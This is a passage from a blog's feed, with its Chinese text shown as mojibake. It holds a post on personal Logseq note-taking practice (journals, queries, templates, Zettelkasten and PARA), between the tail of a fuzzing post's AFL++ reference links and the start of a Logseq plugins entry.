href="https://github.com/AFLplusplus/AFLplusplus/tree/dev">AFL++ dev branch</a><br>[4] <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.llvm.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.llvm.md</a><br>[5] <a href="https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md">https://github.com/AFLplusplus/AFLplusplus/blob/stable/instrumentation/README.cmplog.md</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æˆ‘çš„ Logseq ä½¿ç”¨å®è·µ</title>
    <link href="/cn/logseq_practice/"/>
    <url>/cn/logseq_practice/</url>
    
    <content type="html"><![CDATA[<p>è¿‘ä¸¤å¹´é™†é™†ç»­ç»­å‘è¡¨äº†ä¸€ç³»åˆ—å…³äº Logseq å®è·µçš„æ–‡å­—ï¼Œé›¶æ•£ä¸æ˜“æŸ¥æ‰¾é˜…è¯»ï¼ŒæŠ½ç©ºæ•´ç†æˆä¸€ç¯‡æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¯¹å¤§å®¶æœ‰æ‰€å¸®åŠ©ã€‚</p><h2 id="Logseq-å…‰é€Ÿå…¥é—¨"><a href="#Logseq-å…‰é€Ÿå…¥é—¨" class="headerlink" title="Logseq å…‰é€Ÿå…¥é—¨"></a>Logseq å…‰é€Ÿå…¥é—¨</h2><p>Logseq æ˜¯ä¸ªä¸é”™çš„å·¥å…·ï¼Œå°±æ˜¯å­¦ä¹ æ›²çº¿æœ‰ç‚¹é™¡å³­ï¼Œä¸Šæ‰‹ä¸å¤ªå®¹æ˜“ï¼Œæœ€å¼€å§‹å¯ä»¥ä» journal å¼€å§‹ï¼Œè¿›è¡Œæ—¥å¸¸è®°äº‹å¹¶ä½¿ç”¨ä»»åŠ¡ç®¡ç†åŠŸèƒ½å®‰æ’æ—¥ç¨‹ã€‚</p><p>Logseq çš„é«˜é˜¶ç”¨æ³•æ˜¯åˆ©ç”¨ query å»ºç«‹è‡ªå·±çš„å·¥ä½œæµ ï¼ˆworkflowï¼‰ï¼Œä½¿ç”¨åŸºäº Query çš„ workflow æç¤º next action æ˜¯ Logseq æœ€ç²¾åçš„åŠŸèƒ½ï¼ŒLogseq çš„èµ„æ·±ç”¨æˆ·éƒ½æ˜¯ Query base workflow çš„çˆ±å¥½è€…ã€‚</p><p>ä½†æ˜¯å…¥é—¨è¿˜æ˜¯å»ºè®®ä»åŸºç¡€åŠŸèƒ½çš„ä½¿ç”¨å¼€å§‹ ï¼ˆæ—¥å¿—ï¼ŒåŒé“¾ï¼Œå¤§çº²ï¼Œæœ¬åœ°å­˜å‚¨ ï¼‰ã€‚æˆ‘è‡ªå·±å†™è¿‡ Logseq å››ç¯‡ï¼Œç°åœ¨ç”±äºç¬”è®°ç³»ç»Ÿä¸Šæ‰‹ç†Ÿç»ƒï¼Œè¾“å‡ºåå€’ä¸å¦‚ä»å‰ï¼Œæœ‰ç‚¹æƒ­æ„§ã€‚</p><p><a href="https://www.usmacd.com/cn/logseq/">Logseq è¯•ç”¨æŠ¥å‘Š</a><br><a href="https://www.usmacd.com/cn/logseq2/">Logseq ä½¿ç”¨å°ç»“ï¼ˆäºŒï¼‰</a><br><a href="https://www.usmacd.com/cn/logseq3/">Logseq ä½¿ç”¨å°ç»“ï¼ˆä¸‰ï¼‰</a><br><a href="https://www.usmacd.com/cn/logseq_plugins/">æˆ‘æ­£åœ¨ä½¿ç”¨çš„ Logseq Plugin</a></p><p>å…³äº Logseq çš„ä½¿ç”¨ï¼ŒLuhmann å†™äº†ä¸å°‘é«˜è´¨é‡çš„ Logseq æ–‡ç« ï¼Œæ”¾åœ¨ä»–ä¸ªäººçš„ç½‘ç«™ä¸Š <a href="https://luhmann-logseq.notion.site/">https://luhmann-logseq.notion.site</a> å¯ä»¥é˜…è¯»ä¸€ä¸‹ã€‚</p><p>Luhmann å†™çš„ç»å…¸æ–‡ç«  ä¸‰ä¸ªå¼ºå¤§çš„å·¥å…·å’Œä¸‰ä¸ªé€‰æ‹©ï¼Œå†…å®¹éå¸¸å¾—å¥½ï¼Œä½¿ç”¨ Logseq å‰é˜…è¯»ä¸€éå¯ä»¥å°‘èµ°è®¸å¤šå¼¯è·¯ã€‚å°¤å…¶æ˜¯ä¸‰ä¸ªé€‰æ‹©è¿™ç¯‡ï¼Œåœ¨ä½¿ç”¨ Logseq å‰å¦‚æœä¸ä»”ç»†æ€è€ƒï¼ŒåæœŸè¦æ¨ç¿»é‡æ¥çš„è¯å°±éå¸¸éº»çƒ¦äº†ã€‚</p><div class="note note-info">            <p><a href="https://discuss.logseq.com/t/three-power-tools-i-wish-id-known-about-when-i-started-using-logseq/1683">Three power-tools I wish Iâ€™d known about when I started using Logseq</a></p><ul><li>Templates</li><li>Aliases</li><li>Page-tags</li></ul><p><a href="https://discuss.logseq.com/t/three-choices-new-users-need-to-make/3411">Three Choices New Users Need to Make</a></p><ul><li>First choice: to use a daily journal or not?</li><li>Second Choice: tags, hierarchy, or page-tags?</li><li>Third choice: One graph for everything, or multiple graphs?</li></ul>          </div><h2 id="Logseq-åŒæ­¥åŠŸèƒ½çš„æƒ…å†µ"><a href="#Logseq-åŒæ­¥åŠŸèƒ½çš„æƒ…å†µ" class="headerlink" title="Logseq åŒæ­¥åŠŸèƒ½çš„æƒ…å†µ"></a>Logseq åŒæ­¥åŠŸèƒ½çš„æƒ…å†µ</h2><p>åªæœ‰èµåŠ©ç”¨æˆ·ï¼ˆLogseq Discord æœåŠ¡å™¨ Backer è§’è‰²ï¼‰å¯ä»¥ä½¿ç”¨Logseq å®˜æ–¹æä¾›çš„åŒæ­¥åŠŸèƒ½ï¼Œä½†æ˜¯ Logseq å®˜æ–¹æä¾›çš„åŒæ­¥åŠŸèƒ½ä¸å¤ªç¨³å®šã€‚æˆ‘åœ¨ Discord ä¸Šçœ‹åˆ°äº†å¤ªå¤šæ•°æ®ä¸¢å¤±çš„ä¾‹å­ï¼Œæ‰€ä»¥æˆ‘ä¸æ•¢ç”¨ã€‚</p><p>åŒæ­¥å¯¼è‡´æ•°æ®ä¸¢å¤±çš„æƒ…å†µåœ¨ Logseq å¤šç«¯åŒæ­¥çš„ç”¨æˆ·ä¸­æœ€ä¸ºå¸¸è§ï¼Œå¤šç«¯åŒæ­¥æŒ‡å¤šä¸ªè®¾å¤‡ä¹‹é—´æ•°æ®åŒæ­¥ï¼Œæ¯”å¦‚ MacBook å’Œ iPhone ä¹‹é—´çš„æ•°æ®åŒæ­¥ã€‚</p><p>æˆ‘ä½¿ç”¨ç¬¬ä¸‰æ–¹ç½‘ç›˜å•å‘åŒæ­¥ï¼Œåªæœ‰ä¸€ä¸ªè®¾å¤‡å’Œç½‘ç›˜è‡ªåŠ¨åŒæ­¥ï¼ˆå†™ç½‘ç›˜ï¼‰ï¼Œå…¶ä»–è®¾å¤‡è¯»ç½‘ç›˜åï¼Œæ‰‹åŠ¨å¤åˆ¶ä¸€ä»½æ•°æ®ã€‚</p><p>æœ€è¿‘çœ‹åˆ°è®¸å¤š Community ç”¨æˆ·ä½¿ç”¨ <a href="https://syncthing.net/">Syncthing</a> è¿›è¡Œå¤šç«¯åŒæ­¥ï¼Œæ•ˆæœå¥½åƒä¸é”™ï¼Œä½†æˆ‘è‡ªå·±æ²¡æœ‰å°è¯•è¿™ç§æ–¹æ³•ã€‚(æ¨å‹ Mengxin Liu åé¦ˆï¼ŒSyncthing åŒæ­¥æ•ˆæœä¹Ÿä¸å¤ªå¥½)</p><h2 id="Journal-or-Page-ï¼Ÿ"><a href="#Journal-or-Page-ï¼Ÿ" class="headerlink" title="Journal or Page ï¼Ÿ"></a>Journal or Page ï¼Ÿ</h2><p>Logseq ç”¨æˆ·ç»å¸¸ä¼šé‡ä¸Šä¸€ä¸ªé—®é¢˜ï¼Œç©¶ç«Ÿæ˜¯åœ¨ journal å†™ç¬”è®°è¿˜æ˜¯æ–°å¼€ä¸€ä¸ª page å†™ã€‚community Luhmann ç”¨æˆ·ç»™å‡ºä»–çš„ flowchatï¼Œæˆ‘è§‰å¾—å†™å¾—éå¸¸å¥½ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq5_1.jpeg" alt="Journal or Page"></p><p>æˆ‘è‡ªå·±çš„ç”¨æ³•å¯ä»¥ç®€å•çš„æ¦‚æ‹¬ä¸ºï¼Œåœ¨ Journal è®°å½•è¾ƒä¸ºé›¶æ•£çš„ç‰‡æ®µï¼Œåœ¨ Page ä¸­å¯¹ Journal ä¸­çš„ç‰‡æ®µè¿›è¡Œé‡æ–°ç»„åˆOrganizeï¼ˆèšåˆã€é‡ç»„ã€æ•´åˆï¼‰ã€‚</p><p>Page ä¸­ä¿å­˜è¾ƒä¸ºæ­£å¼çš„æ–‡å­—ï¼ŒJournal ä¸­åˆ™ä¼šè¾ƒä¸ºæ‚ä¹±åœ°è®°å½•æƒ³æ³•ã€‚æŒ‰ç…§ç¬¬äºŒå¤§è„‘ CODE çš„è¯´æ³•ï¼ŒJournal é‡Œ Capture ï¼ŒPage é‡Œ Organize ã€‚</p><h2 id="Journal-è¯¥å†™ç‚¹å•¥-ï¼Ÿ"><a href="#Journal-è¯¥å†™ç‚¹å•¥-ï¼Ÿ" class="headerlink" title="Journal è¯¥å†™ç‚¹å•¥ ï¼Ÿ"></a>Journal è¯¥å†™ç‚¹å•¥ ï¼Ÿ</h2><p>å“ªäº›å†…å®¹å€¼å¾—è®°å½•ï¼Œæ˜¯éå¸¸å¸¸è§çš„é—®é¢˜ã€‚è’‚äºšæˆˆâ€¢ç¦ç‰¹åœ¨ã€Šæ‰“é€ ç¬¬äºŒå¤§è„‘ã€‹ä¸€ä¹¦è¯´è®¤ä¸ºï¼Œå€¼å¾—è®°å½•çš„å†…å®¹ä¸€èˆ¬æœ‰ä¸¤ç±»ã€‚</p><div class="note note-info">            <p><strong>ä¸€ç±»ï¼Œç›´æ¥ä»å¤–éƒ¨ä¸–ç•Œä¸­è·å¾—</strong>ï¼Œæ¯”å¦‚ï¼š<br>    - æ ‡è®°çš„é‡ç‚¹ï¼šä¹¦ç±æˆ–æ–‡ç« é«˜äº®ï¼ˆhighlightï¼‰çš„å†…å®¹<br>    - å¼•ç”¨çš„ä½³å¥ï¼šæ’­å®¢æˆ–æœ‰å£°è¯»ç‰©ä¸­ä»¤äººå°è±¡æ·±åˆ»çš„å†…å®¹<br>    - è¯­éŸ³å¤‡å¿˜ï¼šç§»åŠ¨è®¾å¤‡ä¸Šè®°å½•çš„è¯­éŸ³ç‰‡æ®µ<br>    - ä¹¦ç­¾æˆ–æ”¶è—å¤¹ï¼šä½ æ„Ÿå…´è¶£çš„ç½‘é¡µæˆ–ç¤¾äº¤åª’ä½“çš„é“¾æ¥<br>    - è¯¾ç¨‹è¦ç‚¹ï¼šå‚åŠ è¯¾ç¨‹ï¼Œä¼šè®®ï¼Œæ¼”è®²ç­‰æ´»åŠ¨æ”¶è·çš„å¯ç¤º<br>    - å›¾ç‰‡ï¼šå¯å‘çµæ„Ÿçš„æˆ–æœ‰è¶£çš„ç…§ç‰‡æˆ–è€…å›¾ç‰‡</p><p><strong>ä¸€ç±»ï¼Œä»å†…éƒ¨ä¸–ç•Œè·å¾—</strong>ï¼Œæ¯”å¦‚ï¼š<br>    - æ•…äº‹ï¼šå‘ç”Ÿåœ¨ä½ è‡ªå·±æˆ–è€…åˆ«äººçš„è¶£äº‹<br>    - æ´è§ï¼šå¯¹äº‹ç‰©å°çš„å’Œå¤§çš„è§è§£<br>    - è®°å¿†ï¼šç”Ÿæ´»ä¸­ä¸æƒ³å¿˜è®°çš„ç»å†<br>    - åæ€ï¼šå†™åœ¨æ—¥è®°ä¸Šçš„ä¸ªäººæƒ³æ³•å’Œäººç”Ÿæ•™è®­<br>    - æ²‰æ€ï¼šéšæœºåœ¨è„‘æµ·é‡Œæµ®ç°æƒ³æ³•ï¼ˆæ¯”å¦‚æ´—æ¾¡æ—¶ï¼‰</p>          </div><p>è™½ç„¶å†…å¿ƒä¸–ç•Œçš„æ„Ÿæ‚Ÿå¾ˆçè´µï¼Œä½†æ˜¯å¼•èµ·å…±é¸£çš„å†…å®¹ï¼ˆåŸæ–‡ï¼‰ä¹Ÿå¾ˆæœ‰ä»·å€¼ã€‚åŸæ–‡çš„ä»·å€¼ä¸»è¦åœ¨ä¸‹é¢ä¸¤ç‚¹ï¼š</p><ol><li>æº¯æºï¼šä½¿æˆ‘ä»¬çš„æ€è€ƒæœ‰åšå®çš„åŸºç¡€ï¼Œæœ‰åˆ©äºæ„å»ºæ€è€ƒé“¾æ¡</li><li>å¯å‘ï¼šè®©æˆ‘ä»¬äº§ç”Ÿå…±é¸£çš„å†…å®¹ï¼Œå¯èƒ½å†æ¬¡ç»™æˆ‘ä»¬å¸¦æ¥å¯å‘</li></ol><p>æˆ‘åœ¨ Logseq çš„ Journal ä¸­æœ‰ä¸¤ä¸ªä¿ç•™å†…å®¹ [[ç”Ÿæ´»éšè®°]] å’Œ [[æ¯æ—¥å¿ƒå¾—]]ï¼Œåœ¨å›é¡¾ç¬”è®°çš„è¿‡ç¨‹ä¸­è§‰å¾—è¿™äº›å†…å®¹è¿˜æ˜¯æŒºæœ‰æ„ä¹‰çš„ã€‚</p><p>è¿™äº›å†…å®¹ä»æŸç§æ„ä¹‰ä¸Šæ¥è¯´ç›¸å½“äºæ—¥è®°ï¼Œæ¯å¤©éƒ½å¯¹è‡ªå·±çš„ç»å†è¿›è¡Œè®°å½•å°±åƒç…§é•œå­ä¸€èˆ¬ï¼Œã€Œæ¯æ—¥ä¸‰çœå¾èº«ã€ å€¼å¾—åšæŒã€‚å¯¹å¾…åŒä¸€äº‹ç‰©ï¼Œä¸åŒæ—¶æœŸçš„å¿ƒå¢ƒå¹¶ä¸ç›¸åŒã€‚è®°å½•ä¸‹å½“ä¸‹çš„æ„Ÿå—ï¼ŒåæœŸå†å›è¿‡æ¥çœ‹æ„Ÿè§¦è¿˜æ˜¯æŒºå¤§çš„ã€‚</p><h2 id="ä½¿ç”¨-Logseq-è¿›è¡Œæ—¶é—´ç™»è®°"><a href="#ä½¿ç”¨-Logseq-è¿›è¡Œæ—¶é—´ç™»è®°" class="headerlink" title="ä½¿ç”¨ Logseq è¿›è¡Œæ—¶é—´ç™»è®°"></a>ä½¿ç”¨ Logseq è¿›è¡Œæ—¶é—´ç™»è®°</h2><p>å—å›¾æ‹‰é¼çš„å½±å“ï¼Œåˆ©ç”¨ Logseq å¯ç”¨ä¸¥æ ¼çš„æ—¶é—´ç™»è®°ï¼Œæ•ˆæœä¸é”™ã€‚æ–¹æ³•å¾ˆç®€å•ï¼Œæ”¯æŒ markdown çš„ç¼–è¾‘å™¨ç†è®ºä¸Šéƒ½å¯è¡Œã€‚</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-comment">## Time-block Grid</span><br><span class="hljs-literal">-</span> DONE task1  <span class="hljs-comment"># projectx   09:00 am</span><br><span class="hljs-literal">-</span> DONE task2  <span class="hljs-comment"># projectx   10:00 am</span><br><span class="hljs-literal">-</span> TODO task3  <span class="hljs-comment"># projecty   1:00 pm</span><br></code></pre></td></tr></table></figure><p>å…³äºä¸ºä»€ä¹ˆè¦æ—¶é—´ç™»è®°ï¼Œå¯ä»¥é˜…è¯»é‡‡è®¿å›¾æ‹‰é¼çš„æ’­å®¢ <a href="https://www.usmacd.com/cn/tulading/">å›¾æ‹‰é¼è°ˆç‹¬ç«‹å¼€å‘</a></p><h2 id="ä½¿ç”¨-Logseq-å®šæœŸå›é¡¾ç¬”è®°"><a href="#ä½¿ç”¨-Logseq-å®šæœŸå›é¡¾ç¬”è®°" class="headerlink" title="ä½¿ç”¨ Logseq å®šæœŸå›é¡¾ç¬”è®°"></a>ä½¿ç”¨ Logseq å®šæœŸå›é¡¾ç¬”è®°</h2><p>å®šæœŸå›é¡¾è‡ªå·±çš„ç¬”è®°å¤§ä½“æœ‰ä¸‹é¢å‡ ä¸ªå¥½å¤„:</p><ul><li>å¯¹æŠ—é—å¿˜æ›²çº¿ï¼šå°¤å…¶æ˜¯æ–‡çŒ®ç¬”è®°ç­‰è‡ªå·±ä¸ç†Ÿæ‚‰çš„ç¬”è®°</li><li>æ¨åŠ¨çŸ¥è¯†å†…åŒ–ï¼Œæƒ³æ³•è¿­ä»£ï¼šçŸ¥è¯†ç»“æ„ä¼˜åŒ–ï¼Œæ–°æ—§çŸ¥è¯†è¿æ¥</li><li>é‡è§è¿‡å»çš„è‡ªå·±ï¼š æŒºå¥½ç©ï¼ŒæŒºæœ‰è¶£</li><li>å½±å“ç°å®ï¼šä¿ƒè¿›è‡ªæˆ‘å®¡è§†ï¼Œæä¾›æ€è·¯å’Œçº¿ç´¢</li></ul><p>Logseq è½¯ä»¶æ²¡æœ‰å†…ç½®éšæœºæµè§ˆç¬”è®°çš„æ’ä»¶ï¼Œç¬¬ä¸‰æ–¹æä¾›çš„ Plugin å¯ä»¥å®ç°è¿™ä¸ªç›®çš„ï¼Œä» MarketPlace ä¸‹è½½ logseq-random-note æˆ–è€… Logseq Banners plugin å³å¯ã€‚</p><p>åœ¨æˆ‘çš„çŸ¥è¯†ç®¡ç†å·¥ä½œæµï¼ˆworkflowï¼‰ä¸­å®šæœŸå›é¡¾ç¬”è®°æ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªéƒ¨åˆ†ï¼Œç»å¸¸éƒ½æœ‰æ„æƒ³ä¸åˆ°çš„æ”¶è·ï¼Œåœ¨ <a href="https://www.usmacd.com/cn/note_review/">å®šæœŸå›é¡¾ç¬”è®°çš„å¥½å¤„</a> ä¸­æœ‰æ›´åŠ å…·ä½“çš„é˜è¿°ã€‚</p><h2 id="åˆ©ç”¨-Logseq-æ¥å®è·µå¡ç‰‡ç¬”è®°å·¥ä½œæµ"><a href="#åˆ©ç”¨-Logseq-æ¥å®è·µå¡ç‰‡ç¬”è®°å·¥ä½œæµ" class="headerlink" title="åˆ©ç”¨ Logseq æ¥å®è·µå¡ç‰‡ç¬”è®°å·¥ä½œæµ"></a>åˆ©ç”¨ Logseq æ¥å®è·µå¡ç‰‡ç¬”è®°å·¥ä½œæµ</h2><p>æ€»ä½“æ€è·¯</p><ul><li>åˆ©ç”¨æ¨¡æ¿è‡ªåŠ¨åŒ–è¾“å…¥ç¬”è®°æ ¼å¼ï¼Œå®Œæˆé—ªå¿µç¬”è®°ã€æ–‡çŒ®ç¬”è®°ã€å¼•ç”¨ç¬”è®°ã€ æ°¸ä¹…ç¬”è®°çš„è¾“å…¥çš„æ ‡å‡†åŒ–</li><li>åˆ©ç”¨ query æ¥è‡ªåŠ¨æç¤ºä¸‹ä¸€æ­¥çš„æ“ä½œï¼Œä½¿å¾—æ•´ä¸ªå·¥ä½œæµ actionable</li></ul><p>fleeting note</p><ul><li>åœ¨ daily journal é‡Œåˆ©ç”¨æ¨¡æ¿å†™é—ªå¿µç¬”è®°ï¼Œå°†é—ªå¿µç¬”è®°æ ‡è®°ä¸º TODO ï¼ˆæ„å‘³ç€åç»­éœ€è¦é‡‡å–è¡ŒåŠ¨ï¼‰ï¼Œå½“é—ªå¿µç¬”è®°è¢«ä¸¢å¼ƒæˆ–è€…è½¬ä¸ºæ°¸ä¹…ç¬”è®°åæ ‡è®°ä¸º DONE</li><li>åˆ©ç”¨ query åœ¨ journal è‡ªåŠ¨æç¤ºæœªå®Œæˆçš„ é—ªå¿µç¬”è®°ï¼Œè‡ªåŠ¨æç¤ºæ ‡è®° TODO çš„é—ªå¿µç¬”è®°</li></ul><p>reference note</p><ul><li>åœ¨ daily journal é‡Œåˆ©ç”¨æ¨¡æ¿å†™ reference ç¬”è®°ï¼Œæ‰€æœ‰é˜…è¯»è¿‡çš„èµ„æ–™éƒ½è®°å½•ä¸€æ¡ reference ç¬”è®°</li><li>å¯¹äº reference ä¸­çš„æ–‡ç« ã€è®ºæ–‡ã€æˆ–ä¹¦ç±ï¼Œéœ€è¦æ·±å…¥åˆ†æçš„è¯ï¼Œå°±æ–°å»ºä¸€ä¸ªé¡µé¢åœ¨é‡Œé¢å†™ç¬”è®°</li><li>åˆ©ç”¨ query åˆ—å‡ºæ‰€æœ‰ reference ç¬”è®°ï¼Œç›¸å½“äºæ‹¥æœ‰äº†ä¸ªäººçš„å›¾ä¹¦é¦† (ç´¢å¼•)</li></ul><p>permanent note</p><ul><li>åœ¨ daily query é¡µé¢åˆ©ç”¨æ¨¡æ¿å†™æ°¸ä¹…ç¬”è®°ï¼Œæ°¸ä¹…ç¬”è®°è‡ªç¼–å·</li><li>åœ¨å•ç‹¬çš„é¡µé¢å†™æ°¸ä¹…ç¬”è®°å…·ä½“å†…å®¹ï¼Œåœ¨æ°¸ä¹…ç¬”è®°é¡µé¢çºªå½•æ¥æºï¼Œçˆ¶æ°¸ä¹…ç¬”è®°</li></ul><p>ä½¿ç”¨ Logseq æ—¶ä¸€å®šè¦å¤šç”¨ Template åŠŸèƒ½ï¼Œè¿™æ˜¯ä¿è¯ç¬”è®°æ ¼å¼ä¸€è‡´æ€§çš„å…³é”®ï¼Œå¯ä»¥è‡ªåŠ¨æç¤ºåº”è¯¥è®°å½•çš„ä¿¡æ¯ï¼Œå…·ä½“å†…å®¹å¯ä»¥å‚è€ƒæˆ‘å‰æ®µæ—¶é—´å†™çš„ <a href="https://www.usmacd.com/cn/zel_note_flow">å¡ç‰‡ç›’ç¬”è®°æ³•æ€»ä½“æ€è·¯ä¸å·¥ä½œæµ</a></p><h2 id="Zettelkasten-PARA-çš„-Logseq-å®è·µ"><a href="#Zettelkasten-PARA-çš„-Logseq-å®è·µ" class="headerlink" title="Zettelkasten + PARA çš„ Logseq å®è·µ"></a>Zettelkasten + PARA çš„ Logseq å®è·µ</h2><p>è‡ªä»ä½¿ç”¨ Logseq å®è·µ Zettelkasten åï¼Œæˆ‘å¤§è‡´å‘äº† 1000 æ¡æ¨æ–‡ï¼Œå…¶ä¸­æœ‰é˜…è¯»çš„æ–‡çŒ®ç¬”è®°ï¼Œä¹Ÿæœ‰è‡ªå·±æ€è€ƒçš„æ°¸ä¹…ç¬”è®°ã€‚æˆ‘åœ¨è¿™ä¸¤å¹´çš„æ—¶é—´æ€è€ƒäº†å¤§é‡çš„é—®é¢˜ï¼Œå—ç›ŠåŒªæµ…ã€‚ å†™å¡ç‰‡ç¬”è®°çš„ç›®çš„æ˜¯ä¸ºäº†ä¿ƒè¿›æ€è€ƒï¼Œç›®å‰æ­£åœ¨å®è·µçš„ PARA åˆè¯æ˜å¯ä»¥æ¨åŠ¨é¡¹ç›®çš„è¿›å±•ã€‚</p><p>ç¬”è®°å·¥å…·æœ‰æ²¡æœ‰ç”¨ï¼Œå…³é”®åœ¨äºäººï¼Œéœ€è¦æœ‰æ–¹æ³•è®ºçš„æ”¯æ’‘ï¼Œå¦‚æœæ²¡æœ‰æ–¹æ³•è®ºçš„æŒ‡å¯¼ï¼Œè®¤ä¸ºä½¿ç”¨ä¸€ä¸ªå·¥å…·å°±å¯ä»¥è§£å†³æ‰€æœ‰é—®é¢˜ï¼Œä¸–ç•Œä¸Šæ²¡æœ‰è¿™ä¹ˆç¥å¥‡çš„å·¥å…·ã€‚</p><p>PARA ä½¿ç”¨åˆ†ç±»çš„æ–¹æ³•å°†æ‰€æœ‰çš„ä¿¡æ¯åˆ†æˆå››ç±»ï¼šProjects (å¯æ“ä½œçš„çŸ­æœŸç›®æ ‡)ï¼ŒAreas (æŒç»­å…³æ³¨çš„é•¿æœŸç›®æ ‡)ï¼ŒResources (æ„Ÿå…´è¶£çš„ä¸»é¢˜)ï¼ŒArchives (å‰ä¸‰ç±»ä¸­ä¸æ´»è·ƒçš„)</p><div class="note note-info">            <ul><li>Projectsï¼šçŸ­æœŸç›®æ ‡ï¼Œæœ‰æˆªæ­¢æ—¶é—´ ï¼š è´­ä¹°æ–°ç”µè„‘ï¼Œå†™ç ”ç©¶æŠ¥å‘Šï¼Œè®¾ç½®æ–°å®¢å…å®¶å…· ç­‰</li><li>Areasï¼šé•¿æœŸç›®æ ‡å’Œè´Ÿè´£çš„å†…å®¹ï¼šå¦‚ çˆ¶äº²ï¼Œäº§å“ç®¡ç†ï¼Œå¥åº·ï¼Œè´¢åŠ¡ ç­‰</li><li>Resourcesï¼š æ„Ÿå…´è¶£çš„ä¸»é¢˜ï¼šå‘¼å¸ç»ƒä¹ ï¼Œæ‘„å½±ï¼Œå’–å•¡ï¼Œé‡‘èæŠ•èµ„ ç­‰</li><li>Archives ï¼šä¸å†æ´»è·ƒçš„å‰ä¸‰ç±»ï¼šå®Œæˆæˆ–æš‚åœçš„é¡¹ç›®ï¼Œä¸å†æ´»è·ƒçš„é¢†åŸŸï¼Œä¸æ„Ÿå…´è¶£çš„ä¸»é¢˜ ç­‰</li></ul>          </div><p> PARA å¹¶ä¸æ˜¯å°†ä¸œè¥¿æ”¾è¿›æ–‡ä»¶å¤¹çš„åˆ†ç±»ï¼Œè€Œæ˜¯è¯†åˆ«ä½ æ‰€è´Ÿè´£çš„å·¥ä½œå’Œç”Ÿæ´»çš„ç»“æ„ã€‚å…³äº PARA æ–¹æ³•ï¼Œæˆ‘ä½¿ç”¨ Claude ç¿»è¯‘äº† Tiago Forte çš„æ–‡ç«  <a href="https://www.usmacd.com/cn/PARA/">ä¸€ç§’é’Ÿå†…æ•´ç†æ•°å­—ç”Ÿæ´»çš„ç³»ç»Ÿ</a>ï¼Œæ–‡ç« é‡Œæœ‰æ›´åŠ è¯¦ç»†çš„ä»‹ç» ã€‚</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/logseq5_2.jpeg" alt="Logseq graph"></p><h2 id="ä¸è¦ç¥è¯åŒé“¾ç¬”è®°æ–¹æ³•"><a href="#ä¸è¦ç¥è¯åŒé“¾ç¬”è®°æ–¹æ³•" class="headerlink" title="ä¸è¦ç¥è¯åŒé“¾ç¬”è®°æ–¹æ³•"></a>ä¸è¦ç¥è¯åŒé“¾ç¬”è®°æ–¹æ³•</h2><p>ç”¨äº†ä¸¤å¹´çš„ Logseq åï¼Œç¥å¥‡çš„å‘ç°æˆ‘å¥½åƒä¸æ€ä¹ˆä½¿ç”¨åŒé“¾äº†ã€‚</p><p>Journal çš„å¥½å¤„æ˜¯å¯ä»¥éšæ—¶è¾“å…¥ä¸€ä¸ªè¾ƒä¸ºå®Œæ•´çš„æ–‡å­—ç‰‡æ®µï¼Œå¿ƒæ™ºè´Ÿæ‹…å¾ˆå°ã€‚ ä½†å¦‚æœè¦çœŸæ­£å¯¹æŸä¸ªä¸»é¢˜æœ‰è¾ƒä¸ºæ·±åˆ»çš„ç†è§£ï¼Œéœ€è¦å°†é›¶ç¢ç‰‡æ®µçš„å®Œæ•´é€»è¾‘å’Œå‰åå…³ç³»ä¸²è¿èµ·æ¥ã€‚</p><p>çœŸæ­£å¯ä»¥å®ç°è¿™ä¸ªç›®æ ‡çš„æ˜¯å†™æ–‡ç« ï¼Œè€Œä¸æ˜¯ä¾é åŒå‘é“¾æ¥ã€‚ åªè¦å†™æ–‡ç« çš„æ—¶å€™ï¼Œä½ éœ€è¦çš„æ‰€æœ‰å†…å®¹éƒ½åœ¨åŒä¸€ä¸ªåœ°æ–¹ï¼Œå…·ä½“çš„æ˜¯ç”¨ä½¿ç”¨æ ‡ç­¾ï¼Œè¿˜æ˜¯æ–‡ä»¶å¤¹éƒ½ä¸æ˜¯é‡è¦ã€‚</p><p>çŸ¥è¯†ä½“ç³»çš„æ„å»ºæ˜¯é€šè¿‡ä¸æ–­å­¦ä¹ å’Œè‡ªæˆ‘è¿­ä»£æ¥å®ç°ï¼Œè¾¹ç•Œçš„å»¶ä¼¸åˆ™å¯ä»¥è·Ÿéšç€è‡ªå·±çš„å¥½å¥‡å¿ƒï¼Œå­¦ä¹ çœŸçš„æ˜¯ä¸€ä»¶å¾ˆæœ‰è¶£çš„äº‹æƒ…ã€‚</p><p>æœ€è¿‘æœ‰ä¸€ä¸ªä½“ä¼šï¼Œå·¥å…·çœŸçš„ä¸é‡è¦ï¼Œåº•å±‚æ–¹æ³•è®ºæ‰æ˜¯é‡è¦çš„ä¸œè¥¿ã€‚</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul><li><a href="https://www.usmacd.com/cn/zel_note_flow/">å¡ç‰‡ç›’ç¬”è®°æ³•æ€»ä½“æ€è·¯ä¸å·¥ä½œæµ</a></li><li><a href="https//wilde-at-heart.garden/pages/my-zettelkasten-workflow-from-start-to-finish/">My Zettelkasten workflow from start to finish</a></li><li><a href="https://www.usmacd.com/cn/note_review/">å®šæœŸå›é¡¾ç¬”è®°çš„å¥½å¤„</a></li><li><a href="https://www.usmacd.com/cn/PARA/">ä¸€ç§’é’Ÿå†…æ•´ç†æ•°å­—ç”Ÿæ´»çš„ç³»ç»Ÿ</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Some Logseq plugins I&#39;m currently using</title>
    <link href="/en/logseq_plugins_en/"/>
    <url>/en/logseq_plugins_en/</url>
    
